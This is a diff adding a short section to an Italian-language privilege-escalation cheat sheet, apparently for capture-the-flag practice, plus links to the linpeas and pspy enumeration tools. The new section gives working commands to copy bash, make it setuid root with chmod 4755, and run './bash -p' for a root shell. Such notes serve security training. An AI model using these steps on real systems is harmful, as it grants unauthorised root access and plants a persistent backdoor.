@@ -39,6 +39,25 @@ cd /home/flag
 ./get_flag
 ```
 
+### modifica permessi come root
+se possiamo modificare i permessi di un file come root allora possiamo:
+
+utente low priv
+```
+cp /bin/bash .
+```
+
+utente root
+```
+chown root:root bash
+chmod 4755 ./bash
+```
+
+utente low priv
+```
+./bash -p
+```
+
 ## tools
 - [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) --> enumerazione per privilege escalation 
 - [pspy](https://github.com/DominicBreuker/pspy) --> enumera tutti i processi attivi sul sistema
